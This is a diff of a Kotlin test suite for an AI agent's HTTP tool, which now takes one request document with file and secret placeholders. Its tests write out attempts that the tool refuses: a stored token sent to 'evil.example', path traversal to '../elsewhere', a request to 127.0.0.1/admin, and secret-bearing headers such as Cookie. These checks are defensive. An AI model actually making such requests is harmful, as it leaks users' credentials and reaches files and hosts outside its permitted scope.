@@ -15,7 +15,13 @@ import java.io.File
  *
  * This is the tool that replaces a typed method per service: `gh`, `createRepo`, `dispatch`, and the
  * four `REPOSITORY:` bindings that had to be kept in step. The tests below are therefore about the
- * four things that make that safe rather than about any particular API.
+ * things that make that safe rather than about any particular API.
+ *
+ * **The request is one document**, which is the operator's design: *"an http command is just a tool
+ * http with header and body arguments or even better if as one complete argument, that can be written
+ * directly or take a path to a file, and all {{}} paths and secrets inside that argument get
+ * expanded, recursively."* So a test writes the request the way a person would, and the assertions are
+ * about what left the phone.
  *
  * **The one that must never be deleted is [the vault's value never appears anywhere].** Everything
  * else is a convenience; that one is the difference between an agent that can authenticate and an
@@ -88,8 +94,9 @@ class HttpToolTest {
     private fun call(tool: String, args: String) =
         tools().run(Call(id = "c-$tool", tool = tool, args = args))
 
-    private fun args(vararg pairs: Pair<String, Any>) =
-        JSONObject(mapOf(*pairs)).toString()
+    /** One call whose `request` is the document as written, which is the shape the tool takes. */
+    private fun send(document: String) =
+        tools().run(Call(id = "c-http", tool = "http", args = JSONObject(mapOf("request" to document)).toString()))
 
     // ---- an archive says what is inside it --------------------------------
 
@@ -111,9 +118,7 @@ class HttpToolTest {
         }
         answer = buffer.toByteArray()
 
-        val body = tools().run(
-            Call(id = "c-zip", tool = "http", args = args("method" to "GET", "url" to "https://example.com/lib.zip")),
-        )
+        val body = send("GET https://example.com/lib.zip")
 
         assertTrue("the names are there: $body", body.contains("lib/a.kt"))
         assertTrue("and the second: $body", body.contains("lib/b.kt"))
@@ -128,9 +133,7 @@ class HttpToolTest {
     fun `a file that is not an archive gets no entry list`() {
         answer = "two litres".toByteArray()
 
-        val body = tools().run(
-            Call(id = "c-txt", tool = "http", args = args("method" to "GET", "url" to "https://example.com/notes.txt")),
-        )
+        val body = send("GET https://example.com/notes.txt")
 
         assertTrue("it worked: $body", body.startsWith("0\n"))
         assertFalse("and there is no listing: $body", body.contains("It holds:"))
@@ -145,18 +148,56 @@ class HttpToolTest {
      */
     @Test
     fun `the method and body are the caller's, not the app's`() {
-        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":1}"}""")
+        val said = send("POST https://api.example.com/x\n\n{\"a\":1}")
 
         assertTrue(said, said.startsWith(AgentLog.SUCCESS))
         assertEquals("POST", askedMethod)
         assertEquals("""{"a":1}""", String(askedBody!!, Charsets.UTF_8))
     }
 
-    /** A GET with no method given is a GET, because that is what a person means by "fetch this". */
+    /** An address alone is a GET, because that is what a person means by writing one down. */
     @Test
     fun `a request with no method is a GET`() {
-        call("http", """{"url":"https://api.example.com/x"}""")
+        send("https://api.example.com/x")
         assertEquals("GET", askedMethod)
+    }
+
+    /** Headers are the lines between the first one and the blank one, and they arrive as written. */
+    @Test
+    fun `headers are read from the lines after the address`() {
+        send(
+            "GET https://api.example.com/x\n" +
+                "X-GitHub-Api-Version: 2022-11-28\n" +
+                "Accept: application/json",
+        )
+
+        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
+        assertEquals("application/json", askedHeaders["Accept"])
+    }
+
+    /**
+     * **A `#` or `//` line above the request is a comment**, so a file can say what it is for — and
+     * neither survives into the request.
+     */
+    @Test
+    fun `comments above the request are not headers`() {
+        send("# what this does\n// and why\nGET https://api.example.com/x")
+
+        assertEquals("GET", askedMethod)
+        assertTrue("no comment reached the headers: $askedHeaders", askedHeaders.keys.none { it.startsWith("#") })
+        assertEquals("and no header was invented", 0, askedHeaders.size)
+    }
+
+    /**
+     * **The body is everything after the blank line, verbatim.** A trailing newline in a shell script
+     * being POSTed is data, and a body that was trimmed would arrive different from the file it was
+     * cut from.
+     */
+    @Test
+    fun `the body is not trimmed`() {
+        send("POST https://api.example.com/x\n\nline one\nline two\n")
+
+        assertEquals("line one\nline two\n", String(askedBody!!, Charsets.UTF_8))
     }
 
     /**
@@ -165,7 +206,7 @@ class HttpToolTest {
      */
     @Test
     fun `a GET with a body is refused and says which verb to use`() {
-        val said = call("http", """{"url":"https://api.example.com/x","body":"hello"}""")
+        val said = send("GET https://api.example.com/x\n\nhello")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("POST"))
@@ -175,43 +216,140 @@ class HttpToolTest {
     /** A verb the app cannot send is refused with the list, not by the connection with a stack trace. */
     @Test
     fun `an unknown method is refused with the ones that work`() {
-        val said = call("http", """{"method":"TRACE","url":"https://api.example.com/x"}""")
+        val said = send("TRACE https://api.example.com/x")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("PATCH"))
         assertEquals("nothing was sent", null, askedMethod)
     }
 
-    /** `@path` posts a file, which is how a picture or a payload that will not fit in a string goes. */
+    /** A header line with no colon is refused by naming it, because a 400 from the server would not. */
     @Test
-    fun `a body of at-path posts the file`() {
-        File(project, "payload.json").writeText("{\"from\":\"a file\"}")
+    fun `a line that is not a header is refused and quoted`() {
+        val said = send("POST https://api.example.com/x\nnot a header\n\n{}")
 
-        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"@payload.json"}""")
+        assertTrue(said, said.startsWith(AgentLog.FAILURE))
+        assertTrue("it quotes the line: $said", said.contains("not a header"))
+        assertEquals("nothing was sent", null, askedMethod)
+    }
 
-        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
-        assertEquals("{\"from\":\"a file\"}", String(askedBody!!, Charsets.UTF_8))
+    // ---- the two things that may be written as a name ----------------------
+
+    /**
+     * **`{{file:path}}` is that file's text**, so a request can be assembled from notes that live in
+     * the project rather than retyped into a body.
+     */
+    @Test
+    fun `a file name in the body is replaced with its contents`() {
+        File(project, "title.txt").writeText("Milk")
+        File(project, "body.md").writeText("two litres, please")
+
+        send(
+            "POST https://api.example.com/issues\n" +
+                "Content-Type: application/json\n" +
+                "\n" +
+                "{\"title\":\"{{file:title.txt}}\",\"body\":\"{{file:body.md}}\"}",
+        )
+
+        assertEquals(
+            """{"title":"Milk","body":"two litres, please"}""",
+            String(askedBody!!, Charsets.UTF_8),
+        )
+    }
+
+    /** A file's name works in a header too, which is how a set of headers is kept in one place. */
+    @Test
+    fun `a file name in a header is replaced too`() {
+        File(project, "version.txt").writeText("2022-11-28")
+
+        send("GET https://api.example.com/x\nX-GitHub-Api-Version: {{file:version.txt}}")
+
+        assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
     }
 
     /**
-     * **A body file outside the project is refused.** A body is read and then sent to a server, so
-     * `@../other-project/notes.md` must not resolve — the same rule `read` follows, applied to the
-     * one tool that sends what it reads somewhere else.
+     * **A name inside a named file is expanded as well**, which is the "recursively" in the operator's
+     * sentence: a body cut from a template that itself names a secret.
      */
     @Test
-    fun `a body file outside the project is refused`() {
-        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"@../elsewhere.md"}""")
+    fun `a file that names a secret has the secret expanded inside it`() {
+        credentials.setSecret("github", "ghp_the_real_token", "api.example.com")
+        File(project, "template.http").writeText(
+            "GET https://api.example.com/user\nAuthorization: Bearer {{secret:github}}",
+        )
+
+        val said = send("@template.http")
+
+        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
+        assertEquals("Bearer ghp_the_real_token", askedHeaders["Authorization"])
+        assertFalse("and the value is still nowhere in the answer: $said", said.contains("ghp_the_real_token"))
+    }
+
+    /** A file that names itself is refused rather than recursing until the phone runs out of memory. */
+    @Test
+    fun `a file that names itself is refused`() {
+        File(project, "loop.txt").writeText("{{file:loop.txt}}")
+
+        val said = send("POST https://api.example.com/x\n\n{{file:loop.txt}}")
+
+        assertTrue(said, said.startsWith(AgentLog.FAILURE))
+        assertTrue("it says the document names itself: $said", said.contains("itself"))
+        assertEquals("nothing was sent", null, askedMethod)
+    }
+
+    /** A file outside the project is refused: a body is read and then sent somewhere. */
+    @Test
+    fun `a file name outside the project is refused`() {
+        File(temp.root, "elsewhere.md").writeText("a secret")
+
+        val said = send("POST https://api.example.com/x\n\n{{file:../elsewhere.md}}")
+
+        assertTrue(said, said.startsWith(AgentLog.FAILURE))
+        assertTrue("it names what it could not find: $said", said.contains("elsewhere.md"))
+        assertEquals("nothing was sent", null, askedMethod)
+    }
+
+    /**
+     * **`@path` sends a request file**, and that is how a `.http` file in the project is run — the same
+     * document, read from disk instead of from the argument.
+     */
+    @Test
+    fun `at-path runs a request file from the project`() {
+        File(project, "user.http").writeText(
+            "# who am I\nGET https://api.example.com/user\nAccept: application/json",
+        )
+
+        val said = send("@user.http")
+
+        assertTrue(said, said.startsWith(AgentLog.SUCCESS))
+        assertEquals("https://api.example.com/user", askedUrl)
+        assertEquals("application/json", askedHeaders["Accept"])
+    }
+
+    /** A request file outside the project is refused, for the same reason a body file is. */
+    @Test
+    fun `a request file outside the project is refused`() {
+        val said = send("@../elsewhere.http")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("outside this project"))
         assertEquals("nothing was sent", null, askedMethod)
     }
 
+    /** A request file that is not there is refused by name rather than by an empty request. */
+    @Test
+    fun `a request file that is not there is refused`() {
+        val said = send("@missing.http")
+
+        assertTrue(said, said.startsWith(AgentLog.FAILURE))
+        assertTrue("it names the file: $said", said.contains("missing.http"))
+    }
+
     // ---- the vault ---------------------------------------------------------
 
     /**
-     * **THE TEST THAT MUST NEVER BE DELETED.** A named secret is attached as a Bearer token, and its
-     * value appears nowhere: not in the answer, not in the headers the caller set, not in the trace.
+     * **THE TEST THAT MUST NEVER BE DELETED.** A named secret is written where it is used, and its
+     * value appears nowhere: not in the answer, not in the headers the caller wrote, not in the trace.
      *
      * A tool that echoed the token back would put it in the conversation and in the request log, which
      * is the one failure the vault exists to prevent — and it would look like a helpful diagnostic
@@ -221,7 +359,7 @@ class HttpToolTest {
     fun `the vault's value never appears anywhere`() {
         credentials.setSecret("github", "ghp_the_real_token", "api.example.com")
 
-        val said = call("http", """{"url":"https://api.example.com/user","auth":"github"}""")
+        val said = send("GET https://api.example.com/user\nAuthorization: Bearer {{secret:github}}")
 
         assertTrue(said, said.startsWith(AgentLog.SUCCESS))
         assertEquals("it was attached", "Bearer ghp_the_real_token", askedHeaders["Authorization"])
@@ -234,15 +372,15 @@ class HttpToolTest {
     /**
      * **A secret is refused for a host it was not stored for, and the refusal names the host.**
      *
-     * This is the hole that `auth:` would otherwise open: without it the agent names the secret and
-     * chooses the destination, which is exfiltration rather than authentication. The sentence matters
-     * as much as the refusal — "401" would send the model to retry the same thing.
+     * This is the hole a name would otherwise open: without it the agent names the secret and chooses
+     * the destination, which is exfiltration rather than authentication. The sentence matters as much
+     * as the refusal — "401" would send the model to retry the same thing.
      */
     @Test
     fun `a secret is refused for a host it is not for, and the refusal says so`() {
         credentials.setSecret("github", "ghp_the_real_token", "api.github.com")
 
-        val said = call("http", """{"url":"https://evil.example/x","auth":"github"}""")
+        val said = send("GET https://evil.example/x\nAuthorization: Bearer {{secret:github}}")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue("it names the host it was asked for: $said", said.contains("evil.example"))
@@ -256,7 +394,7 @@ class HttpToolTest {
         credentials.setSecret("github", "ghp_one", "api.github.com")
         credentials.setSecret("linear", "lin_two", "mcp.linear.app")
 
-        val said = call("http", """{"url":"https://api.github.com/user","auth":"gitlab"}""")
+        val said = send("GET https://api.github.com/user\nAuthorization: Bearer {{secret:gitlab}}")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("\"github\""))
@@ -270,14 +408,11 @@ class HttpToolTest {
      * value never travels through text.
      */
     @Test
-    fun `a hand-written authorization header is refused, and names auth instead`() {
-        val said = call(
-            "http",
-            """{"url":"https://api.example.com/x","headers":{"Authorization":"Bearer ghp_typed"}}""",
-        )
+    fun `a hand-written authorization header is refused, and names the placeholder`() {
+        val said = send("GET https://api.example.com/x\nAuthorization: Bearer ghp_typed")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
-        assertTrue("it says what to do instead: $said", said.contains("\"auth\""))
+        assertTrue("it says what to write instead: $said", said.contains("{{secret:"))
         assertEquals("nothing was sent", null, askedMethod)
     }
 
@@ -285,10 +420,7 @@ class HttpToolTest {
     @Test
     fun `cookie, proxy-authorization and x-api-key are refused too`() {
         for (header in listOf("Cookie", "Proxy-Authorization", "X-Api-Key")) {
-            val said = call(
-                "http",
-                """{"url":"https://api.example.com/x","headers":{"$header":"secret"}}""",
-            )
+            val said = send("GET https://api.example.com/x\n$header: secret")
             assertTrue("$header: $said", said.startsWith(AgentLog.FAILURE))
             assertEquals("$header sent nothing", null, askedMethod)
         }
@@ -297,10 +429,7 @@ class HttpToolTest {
     /** Any other header is the caller's, because an API may require one and only four carry secrets. */
     @Test
     fun `an ordinary header is sent`() {
-        call(
-            "http",
-            """{"url":"https://api.example.com/x","headers":{"X-GitHub-Api-Version":"2022-11-28"}}""",
-        )
+        send("GET https://api.example.com/x\nX-GitHub-Api-Version: 2022-11-28")
         assertEquals("2022-11-28", askedHeaders["X-GitHub-Api-Version"])
     }
 
@@ -316,7 +445,7 @@ class HttpToolTest {
         status = 422
         answer = """{"message":"Validation Failed","errors":[{"field":"name"}]}""".toByteArray()
 
-        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{}"}""")
+        val said = send("POST https://api.example.com/x\n\n{}")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue("the number is there: $said", said.contains("422"))
@@ -329,7 +458,7 @@ class HttpToolTest {
         status = 204
         answer = ByteArray(0)
 
-        val said = call("http", """{"method":"DELETE","url":"https://api.example.com/x"}""")
+        val said = send("DELETE https://api.example.com/x")
 
         assertTrue(said, said.startsWith(AgentLog.SUCCESS))
         assertTrue(said, said.contains("204"))
@@ -342,7 +471,7 @@ class HttpToolTest {
      */
     @Test
     fun `the answer is filed under agent http and the path is said`() {
-        val said = call("http", """{"url":"https://api.example.com/user"}""")
+        val said = send("GET https://api.example.com/user")
 
         assertTrue(said, said.startsWith(AgentLog.SUCCESS))
         assertTrue("it says where: $said", said.contains("agent/http/"))
@@ -360,8 +489,8 @@ class HttpToolTest {
      */
     @Test
     fun `two posts to one url are two files`() {
-        call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":1}"}""")
-        call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{\"a\":2}"}""")
+        send("POST https://api.example.com/x\n\n{\"a\":1}")
+        send("POST https://api.example.com/x\n\n{\"a\":2}")
 
         assertEquals("two answers, kept apart", 2, File(project, Fetched.HTTP_DIR).listFiles().orEmpty().size)
     }
@@ -371,7 +500,7 @@ class HttpToolTest {
     fun `a binary answer is filed and not quoted`() {
         answer = byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0, 0, 0, 0)
 
-        val said = call("http", """{"url":"https://api.example.com/picture.png"}""")
+        val said = send("GET https://api.example.com/picture.png")
 
         assertTrue(said, said.startsWith(AgentLog.SUCCESS))
         assertTrue("it says it was filed: $said", said.contains("filed, not quoted"))
@@ -383,7 +512,7 @@ class HttpToolTest {
         status = 301
         extraHeaders = mapOf("Location" to "https://api.example.com/elsewhere")
 
-        val said = call("http", """{"method":"POST","url":"https://api.example.com/x","body":"{}"}""")
+        val said = send("POST https://api.example.com/x\n\n{}")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("301"))
@@ -395,7 +524,7 @@ class HttpToolTest {
     fun `a nearly-spent rate limit is said`() {
         extraHeaders = mapOf("X-RateLimit-Remaining" to "2", "X-RateLimit-Reset" to "1700000000")
 
-        val said = call("http", """{"url":"https://api.example.com/user"}""")
+        val said = send("GET https://api.example.com/user")
 
         assertTrue(said, said.contains("2 requests remain"))
         assertTrue(said, said.contains("1700000000"))
@@ -403,18 +532,19 @@ class HttpToolTest {
 
     // ---- refusals that come before anything is sent ------------------------
 
-    /** A missing url is refused with the shape to use, not with a stack trace. */
+    /** A missing request is refused with the shape to use, not with a stack trace. */
     @Test
-    fun `no url is refused`() {
+    fun `no request is refused, and the shape is shown`() {
         val said = call("http", "{}")
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
-        assertTrue("it names the argument to give: $said", said.contains("url"))
+        assertTrue("it names the argument to give: $said", said.contains("request"))
+        assertTrue("and shows a request: $said", said.contains("GET https://"))
     }
 
     /** The address rule runs before the request, because the request is the harm. */
     @Test
     fun `a private address is refused before anything is opened`() {
-        val said = call("http", """{"url":"http://127.0.0.1/admin"}""")
+        val said = send("GET http://127.0.0.1/admin")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertEquals("nothing was sent", null, askedMethod)
@@ -428,7 +558,13 @@ class HttpToolTest {
             credentials = credentials,
             fetcher = fetcher(),
             httpAllowed = { false },
-        ).run(Call(id = "c-http", tool = "http", args = """{"url":"https://api.example.com/x"}"""))
+        ).run(
+            Call(
+                id = "c-http",
+                tool = "http",
+                args = JSONObject(mapOf("request" to "GET https://api.example.com/x")).toString(),
+            ),
+        )
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("switched off"))
@@ -440,7 +576,7 @@ class HttpToolTest {
     fun `a request that fails says why`() {
         fail = "The request failed: no route to host"
 
-        val said = call("http", """{"url":"https://api.example.com/x"}""")
+        val said = send("GET https://api.example.com/x")
 
         assertTrue(said, said.startsWith(AgentLog.FAILURE))
         assertTrue(said, said.contains("no route to host"))
